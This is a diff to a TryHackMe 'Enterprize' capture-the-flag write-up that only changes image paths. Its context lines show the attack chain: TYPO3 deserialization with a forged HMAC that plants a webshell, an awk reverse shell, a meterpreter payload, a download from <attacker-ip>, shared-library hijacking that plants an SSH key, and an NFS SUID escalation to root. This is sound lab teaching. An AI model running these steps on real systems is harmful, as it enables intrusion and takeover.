@@ -90,7 +90,7 @@ The scan revealed several interesting services:
 443/tcp     https
 ```
 
-![Nmap](/assets/images/writeups/enterprize/1.png)
+![Nmap](/assets/images/writeups/thm/enterprize/1.png)
 
 Since multiple web services were available, I decided to enumerate the HTTP services rather than focusing only on port `80`.
 
@@ -100,7 +100,7 @@ Since multiple web services were available, I decided to enumerate the HTTP serv
 
 Opening the main web application in the browser displayed a very simple page containing: `Nothing to see here`
 
-![Nothing](/assets/images/writeups/enterprize/2.png)
+![Nothing](/assets/images/writeups/thm/enterprize/2.png)
 
 Since there was almost nothing visible on the page, I moved to directory enumeration.
 
@@ -114,7 +114,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
 -t 50
 ```
 
-![403 status](/assets/images/writeups/enterprize/3.png)
+![403 status](/assets/images/writeups/thm/enterprize/3.png)
 
 The scan mostly returned `403 Forbidden` responses, so I tried another wordlist.
 
@@ -126,11 +126,11 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
 
 This time I discovered an interesting file: `composer.json`
 
-![endpoint composer.json](/assets/images/writeups/enterprize/3_1.png)
+![endpoint composer.json](/assets/images/writeups/thm/enterprize/3_1.png)
 
 Visiting `composer.json` revealed information about the application's dependencies.
 
-![packages](/assets/images/writeups/enterprize/4.png)
+![packages](/assets/images/writeups/thm/enterprize/4.png)
 
 The application was using **TYPO3 CMS**, along with packages such as: `guzzlehttp/guzzle`
 
@@ -149,7 +149,7 @@ gobuster vhost \
 --append-domain
 ```
 
-![vhost](/assets/images/writeups/enterprize/4_1.png)
+![vhost](/assets/images/writeups/thm/enterprize/4_1.png)
 
 One of the interesting results was: `maintest.enterprize.thm`
 
@@ -157,7 +157,7 @@ I added the discovered hostname to `/etc/hosts`: `<target-ip> maintest.enterpriz
 
 I then opened the subdomain in the browser.
 
-![vhost on browser](/assets/images/writeups/enterprize/4_2.png)
+![vhost on browser](/assets/images/writeups/thm/enterprize/4_2.png)
 
 The application was again associated with TYPO3.
 
@@ -190,7 +190,7 @@ python3 typo3scan.py \
 --vuln
 ```
 
-![typo3scan](/assets/images/writeups/enterprize/4_3.png)
+![typo3scan](/assets/images/writeups/thm/enterprize/4_3.png)
 
 The results were not particularly useful because the scanner was also affected by the `503 Service Unavailable` responses.
 
@@ -202,7 +202,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
 -t 50
 ```
 
-![subdomain fuzzing](/assets/images/writeups/enterprize/4_4.png)
+![subdomain fuzzing](/assets/images/writeups/thm/enterprize/4_4.png)
 
 Several interesting directories returned `301` responses.
 
@@ -214,19 +214,19 @@ One of the discovered paths was: `/typo3`
 
 Opening it revealed the TYPO3 administration login page.
 
-![typo3 login](/assets/images/writeups/enterprize/4_5.png)
+![typo3 login](/assets/images/writeups/thm/enterprize/4_5.png)
 
 Another interesting directory was: `/typo3conf`
 
-![typo3conf](/assets/images/writeups/enterprize/4_6.png)
+![typo3conf](/assets/images/writeups/thm/enterprize/4_6.png)
 
 Among the exposed files was: `LocalConfiguration.old`
 
 I downloaded the file and inspected its contents.
 
-![LocalConfiguration.old](/assets/images/writeups/enterprize/4_7.png)
+![LocalConfiguration.old](/assets/images/writeups/thm/enterprize/4_7.png)
 
-![LocalConfiguration.old](/assets/images/writeups/enterprize/4_8.png)
+![LocalConfiguration.old](/assets/images/writeups/thm/enterprize/4_8.png)
 
 The file contained old credentials as well as a very important TYPO3 configuration value: `encryptionKey`
 
@@ -256,7 +256,7 @@ By navigating through the TYPO3 website, I found a page containing a contact for
 
 `http://maintest.enterprize.thm/index.php?id=38`
 
-![contact_form](/assets/images/writeups/enterprize/4_10.png)
+![contact_form](/assets/images/writeups/thm/enterprize/4_10.png)
 
 I intercepted the form submission using Burp Suite.
 
@@ -264,7 +264,7 @@ The request contained an interesting parameter: `tx_form_formframework[contactFo
 
 along with the `cHash` value.
 
-![brupsuite post req](/assets/images/writeups/enterprize/4_12.png)
+![brupsuite post req](/assets/images/writeups/thm/enterprize/4_12.png)
 
 The `__state` parameter was important because it contained the serialized state that TYPO3 would process.
 
@@ -280,7 +280,7 @@ Initially, I compared the known signature from the exploit research with common 
 hashid '1337e758bdfgdgd<REDACTED>ffdgdfdf5381337'
 ```
 
-![hashid](/assets/images/writeups/enterprize/cHash.png)
+![hashid](/assets/images/writeups/thm/enterprize/cHash.png)
 
 This suggested that the signature could be SHA1.
 
@@ -298,17 +298,17 @@ For the vulnerable TYPO3 version, I inspected the corresponding source:
 
 [TYPO3 HashService.php](https://github.com/TYPO3/typo3/blob/481259e2e9c0f821af8e8a4cb3477f5dd9c96faf/typo3/sysext/extbase/Classes/Security/Cryptography/HashService.php#L32-L42)
 
-![validateAndStripHmac](/assets/images/writeups/enterprize/hash.png)
+![validateAndStripHmac](/assets/images/writeups/thm/enterprize/hash.png)
 
 `validateAndStripHmac()` eventually calls `validateHmac()`.
 
-![validateHmac](/assets/images/writeups/enterprize/hash1.png)
+![validateHmac](/assets/images/writeups/thm/enterprize/hash1.png)
 
 The generated HMAC is compared against the supplied value.
 
 The generation function shows exactly which algorithm is used.
 
-![generateHmac](/assets/images/writeups/enterprize/hash2.png)
+![generateHmac](/assets/images/writeups/thm/enterprize/hash2.png)
 
 The source confirms that TYPO3 uses: `SHA1` for this HMAC operation.
 
@@ -341,7 +341,7 @@ Then inspected the relevant gadget:
 php phpggc -i Guzzle/FW1
 ```
 
-![phpggc](/assets/images/writeups/enterprize/4_9.png)
+![phpggc](/assets/images/writeups/thm/enterprize/4_9.png)
 
 The Guzzle gadget provided a file-write primitive, which was useful because we could write a PHP webshell to a location accessible through the web server.
 
@@ -380,7 +380,7 @@ Guzzle/FW1 \
 > ../serialized_payload.txt
 ```
 
-![synactive_payload](/assets/images/writeups/enterprize/4_13.png)
+![synactive_payload](/assets/images/writeups/thm/enterprize/4_13.png)
 
 The resulting serialized object would later be placed into: `tx_form_formframework[contactForm-144][__state]`
 
@@ -409,7 +409,7 @@ I then calculated the signature:
 php hash_hmac_gen.php "$(cat serialized_payload.txt)"
 ```
 
-![hash_hmac_gen](/assets/images/writeups/enterprize/4_14.png)
+![hash_hmac_gen](/assets/images/writeups/thm/enterprize/4_14.png)
 
 The final value needed to contain the serialized payload together with the valid SHA1 HMAC.
 
@@ -465,13 +465,13 @@ I verified the version:
 sudo docker run -it php:7.2-cli php --version
 ```
 
-![docker](/assets/images/writeups/enterprize/docker.png)
+![docker](/assets/images/writeups/thm/enterprize/docker.png)
 
 The output confirmed that the container was running PHP 7.2.
 
 I also checked out the appropriate PHPGGC revision used for this payload.
 
-![docker_phpggc](/assets/images/writeups/enterprize/docker_phpggc.png)
+![docker_phpggc](/assets/images/writeups/thm/enterprize/docker_phpggc.png)
 
 I then generated the serialized payload inside the PHP 7.2 container:
 
@@ -494,13 +494,13 @@ I regenerated the HMAC using the new serialized payload:
 php hash_hmac_gen.php "$(cat serialized_payload.txt)"
 ```
 
-![serialized and hmac](/assets/images/writeups/enterprize/docker_serialized_1.png)
+![serialized and hmac](/assets/images/writeups/thm/enterprize/docker_serialized_1.png)
 
 I concatenated the serialized payload and HMAC and replaced the original `__state` value in Burp Suite.
 
 Although the HTTP response contained an error, the payload had actually succeeded.
 
-![brupsuite](/assets/images/writeups/enterprize/docker_brupsuite.png)
+![brupsuite](/assets/images/writeups/thm/enterprize/docker_brupsuite.png)
 
 I verified the uploaded webshell:
 
@@ -509,7 +509,7 @@ curl -i \
 'http://maintest.enterprize.thm/fileadmin/_temp_/synactive_payload.php?1=id'
 ```
 
-![curl_webshell_test](/assets/images/writeups/enterprize/docker_webshell_curl.png)
+![curl_webshell_test](/assets/images/writeups/thm/enterprize/docker_webshell_curl.png)
 
 The webshell was working.
 
@@ -523,7 +523,7 @@ I started a Netcat listener:
 nc -lvnp 9999
 ```
 
-![listener](/assets/images/writeups/enterprize/5_1.png)
+![listener](/assets/images/writeups/thm/enterprize/5_1.png)
 
 I then used the webshell to execute an `awk`-based reverse shell:
 
@@ -533,7 +533,7 @@ curl -G \
 'http://maintest.enterprize.thm/fileadmin/_temp_/synactive_payload.php'
 ```
 
-![malicious request](/assets/images/writeups/enterprize/5.png)
+![malicious request](/assets/images/writeups/thm/enterprize/5.png)
 
 The connection succeeded.
 
@@ -545,7 +545,7 @@ id
 
 showed that I had obtained a shell as the web-service user.
 
-![shell](/assets/images/writeups/enterprize/5_2.png)
+![shell](/assets/images/writeups/thm/enterprize/5_2.png)
 
 ---
 
@@ -569,7 +569,7 @@ I served the file:
 python3 -m http.server 8000
 ```
 
-![msfvenom](/assets/images/writeups/enterprize/5_3.png)
+![msfvenom](/assets/images/writeups/thm/enterprize/5_3.png)
 
 On the target, I downloaded it:
 
@@ -581,7 +581,7 @@ ls -lh /tmp/meterpreter.elf
 chmod +x /tmp/meterpreter.elf
 ```
 
-![downloaded and executed](/assets/images/writeups/enterprize/5_4.png)
+![downloaded and executed](/assets/images/writeups/thm/enterprize/5_4.png)
 
 I configured a Metasploit handler:
 
@@ -607,7 +607,7 @@ I upgraded the shell:
 script -qc /bin/bash /dev/null
 ```
 
-![msfconsole connection](/assets/images/writeups/enterprize/5_5.png)
+![msfconsole connection](/assets/images/writeups/thm/enterprize/5_5.png)
 
 At this point I had a more usable shell.
 
@@ -619,7 +619,7 @@ The machine contained a user flag, but it was not accessible with the current ac
 
 The next target was user: `john`
 
-![user.txt](/assets/images/writeups/enterprize/5_6.png)
+![user.txt](/assets/images/writeups/thm/enterprize/5_6.png)
 
 I started looking through John's directories for unusual files, scheduled tasks, binaries, and configuration files.
 
@@ -638,7 +638,7 @@ cd /home/john/develop
 file myapp
 ```
 
-![myapp](/assets/images/writeups/enterprize/5_3.png)
+![myapp](/assets/images/writeups/thm/enterprize/5_3.png)
 
 The binary was an executable that dynamically loaded shared libraries.
 
@@ -648,7 +648,7 @@ I used `strace` to observe its behavior:
 strace ./myapp
 ```
 
-![strace](/assets/images/writeups/enterprize/5_8.png)
+![strace](/assets/images/writeups/thm/enterprize/5_8.png)
 
 The output showed that `myapp` loaded libraries including: `libcustom.so`
 
@@ -667,7 +667,7 @@ cat ld.so.conf
 ls -la ld.so.conf.d
 ```
 
-![etc directory](/assets/images/writeups/enterprize/5_9.png)
+![etc directory](/assets/images/writeups/thm/enterprize/5_9.png)
 
 One of the configuration files was: `x86_64-libc.conf`
 
@@ -691,7 +691,7 @@ python3 -m http.server 8000
 
 I then transferred the tool to the target.
 
-![cronjob](/assets/images/writeups/enterprize/myapp.png)
+![cronjob](/assets/images/writeups/thm/enterprize/myapp.png)
 
 `pspy` revealed that `myapp` was periodically executed by user `john` through a cron job.
 
@@ -731,15 +731,15 @@ My first idea was to make `libcustom.so` execute a reverse shell directly.
 
 I served the malicious library to the target, downloaded it, modified `test.conf`, and waited for the cron job to execute `myapp`.
 
-![reverse shell didnt work here - served and downloaded libcustom.so to www-data](/assets/images/writeups/enterprize/5_11.png)
+![reverse shell didnt work here - served and downloaded libcustom.so to www-data](/assets/images/writeups/thm/enterprize/5_11.png)
 
-![reverse shell didnt work here](/assets/images/writeups/enterprize/5_12.png)
+![reverse shell didnt work here](/assets/images/writeups/thm/enterprize/5_12.png)
 
-![reverse shell didnt work here - edited test.conf](/assets/images/writeups/enterprize/5_13.png)
+![reverse shell didnt work here - edited test.conf](/assets/images/writeups/thm/enterprize/5_13.png)
 
-![reverse shell didnt work here - served and downloaded reverse-shell to www-data](/assets/images/writeups/enterprize/5_14.png)
+![reverse shell didnt work here - served and downloaded reverse-shell to www-data](/assets/images/writeups/thm/enterprize/5_14.png)
 
-![reverse shell didnt work here - meterpreter](/assets/images/writeups/enterprize/5_15.png)
+![reverse shell didnt work here - meterpreter](/assets/images/writeups/thm/enterprize/5_15.png)
 
 However, the reverse-shell approach was unreliable.
 
@@ -809,7 +809,7 @@ __attribute__((constructor)) void hack(void)
 }
 ```
 
-![custom.c](/assets/images/writeups/enterprize/6_1.png)
+![custom.c](/assets/images/writeups/thm/enterprize/6_1.png)
 
 The important part is the constructor: `__attribute__((constructor))`
 
@@ -841,7 +841,7 @@ I then controlled the library search path through:
 echo '/home/john/develop' > /home/john/develop/test.conf
 ```
 
-![gcc server wget tes.conf](/assets/images/writeups/enterprize/6_2.png)
+![gcc server wget tes.conf](/assets/images/writeups/thm/enterprize/6_2.png)
 
 ---
 
@@ -860,7 +860,7 @@ The dynamic linker would search the directory specified by the configuration, an
 
 I waited for the cron task to run.
 
-![cronjob myapp](/assets/images/writeups/enterprize/6_3.png)
+![cronjob myapp](/assets/images/writeups/thm/enterprize/6_3.png)
 
 When the library was loaded, the constructor executed and created: `/home/john/.ssh/` with: `authorized_keys` containing my public key.
 
@@ -874,7 +874,7 @@ I could now authenticate directly as `john`:
 ssh -i id_rsa_john john@enterprize.thm
 ```
 
-![ssh flag](/assets/images/writeups/enterprize/6_4.png)
+![ssh flag](/assets/images/writeups/thm/enterprize/6_4.png)
 
 This gave me access to John's account and allowed me to retrieve the user flag.
 
@@ -896,7 +896,7 @@ On the target:
 wget http://<attacker-ip>:8000/linpeas.sh
 ```
 
-![linpeas](/assets/images/writeups/enterprize/7.png)
+![linpeas](/assets/images/writeups/thm/enterprize/7.png)
 
 Among the interesting findings was an NFS service listening locally on: `2049`
 
@@ -962,7 +962,7 @@ sudo mount -t nfs \
 ~/Desktop/THM_LAB/rooms/hard/enterprize/nfs
 ```
 
-![local_port_forward mount_nfs](/assets/images/writeups/enterprize/7_2.png)
+![local_port_forward mount_nfs](/assets/images/writeups/thm/enterprize/7_2.png)
 
 ---
 
@@ -1036,7 +1036,7 @@ The `-p` option preserves the effective privileges of the SUID executable.
 
 I now had a root shell.
 
-![root flag](/assets/images/writeups/enterprize/7_3.png)
+![root flag](/assets/images/writeups/thm/enterprize/7_3.png)
 
 The final privilege-escalation chain was:
 
@@ -1194,17 +1194,17 @@ ENTERPRIZE
 
 ## All process screenshots
 
-![All Process Screenshot 1](/assets/images/writeups/enterprize/all_process.png)
+![All Process Screenshot 1](/assets/images/writeups/thm/enterprize/all_process.png)
 
-![All Process Screenshot 2](/assets/images/writeups/enterprize/all_process_1.png)
+![All Process Screenshot 2](/assets/images/writeups/thm/enterprize/all_process_1.png)
 
-![All Process Screenshot 3](/assets/images/writeups/enterprize/all_process_2.png)
+![All Process Screenshot 3](/assets/images/writeups/thm/enterprize/all_process_2.png)
 
-![All Process Screenshot 4](/assets/images/writeups/enterprize/all_process_3.png)
+![All Process Screenshot 4](/assets/images/writeups/thm/enterprize/all_process_3.png)
 
-![All Process Screenshot 5](/assets/images/writeups/enterprize/all_process_4.png)
+![All Process Screenshot 5](/assets/images/writeups/thm/enterprize/all_process_4.png)
 
-![All Process Screenshot 6](/assets/images/writeups/enterprize/all_process_5.png)
+![All Process Screenshot 6](/assets/images/writeups/thm/enterprize/all_process_5.png)
 
 ---
 
